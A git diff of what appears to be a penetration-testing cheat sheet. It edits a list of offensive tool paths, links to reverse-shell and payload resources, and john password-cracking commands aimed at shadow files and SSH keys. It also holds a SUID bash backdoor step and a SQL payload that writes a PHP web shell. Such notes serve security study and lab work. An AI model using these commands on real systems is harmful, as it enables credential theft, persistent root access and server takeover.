@@ -48,21 +48,24 @@
 
 | Name        | Installation Path             |
 | ----------- | ----------------------------- |
-| wordlists   | /usr/share/wordlists          |
-| webshells   | /usr/share/webshells          |
-| exploit-db  | /usr/share/exploit-database   |
-| john        | /usr/src/john                 |
-| openvpn     | /usr/sbin/openvpn             |
-| nmap        | /usr/bin/nmap                 |
+| binwalk     | /usr/bin/binwalk              |
 | dirb        | /usr/bin/dirb                 |
-| sqlmap      | /usr/share/sqlmap             |
+| enum4linux  | /usr/share/enum4linux         |
+| exploit-db  | /usr/share/exploit-database   |
+| gobuster    | /usr/bin/gobuster             |
 | hashcat     | /usr/bin/hashcat              |
 | hydra       | /usr/bin/hydra                |
-| netcat      | /bin/nc.openbsd               |
-| enum4linux  | /usr/share/enum4linux         |
-| PEASS-ng    | /usr/share//PEASS-ng          |
+| john        | /usr/src/john                 |
 | metasploit  | /usr/bin/msfconsole           |
 | msfvenom    | /usr/bin/msfvenom             |
+| netcat      | /bin/nc.openbsd               |
+| nikto       | /usr/bin/nikto                |
+| nmap        | /usr/bin/nmap                 |
+| openvpn     | /usr/sbin/openvpn             |
+| PEASS-ng    | /usr/share//PEASS-ng          |
+| sqlmap      | /usr/share/sqlmap             |
+| webshells   | /usr/share/webshells          |
+| wordlists   | /usr/share/wordlists          |
 
 ---
 
@@ -70,12 +73,27 @@
 
 ### Links
 
-- https://www.revshells.com/
+
+**find subdomains**
+- https://phonebook.cz/
+
+**Find EMail adresses to a domain**
+- https://hunter.io/
+ 
+**Reverse Shells**
+- https://www.revshells.com/  
+
+**Decoder**
 - https://gchq.github.io/CyberChef
+
+**Privilege Escalation**
 - https://gtfobins.github.io/
+
+
+**Cheat Sheets**
 - https://pentestmonkey.net/
 - https://github.com/swisskyrepo/PayloadsAllTheThings
-- https://phonebook.cz/
+
 
 ### SMB
 
@@ -88,10 +106,13 @@
 ### BruteForce
 
       /usr/src/john/run/unshadow passwd.txt shadow.txt > unshadowed.txt
-      /usr/src/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
-      /usr/src/john/run/john --show unshadowed.txt
+      /usr/src/john/run/john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+      /usr/src/john/run/john --format=crypt --show unshadowed.txt
 
-      python3 /usr/src/john/run/ssh2john.py id_rsa > id_rsa.hash
+      /usr/src/john/run/john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+      /usr/src/john/run/john --format=raw-MD5 --show hash.txt
+
+      python3 /usr/src/john/run/ssh2john id_rsa > id_rsa.hash
       /usr/src/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
       /usr/src/john/run/john --show id_rsa.hash
 
@@ -104,7 +125,6 @@
 -     uname -a; lsb_release -a; w; id;
 -     find / -perm -u=s -type f 2>/dev/null
 -     chmod u+s /bin/bash # as root
-      /bin/bash -p # as user
 
 -     vim /tmp/ecalate.c
 
@@ -138,7 +158,7 @@ reset
 ```
 
 ### RSH
-> more in [RSH.md](RSH.md)
+> more in [RSH.md](RSH.md) or at [revshells.com](https://www.revshells.com/)
 
 -     SELECT '<?php system($_GET["cmd"]); ?>' INTO dumpfile ‘/tmp/somefile’;
 
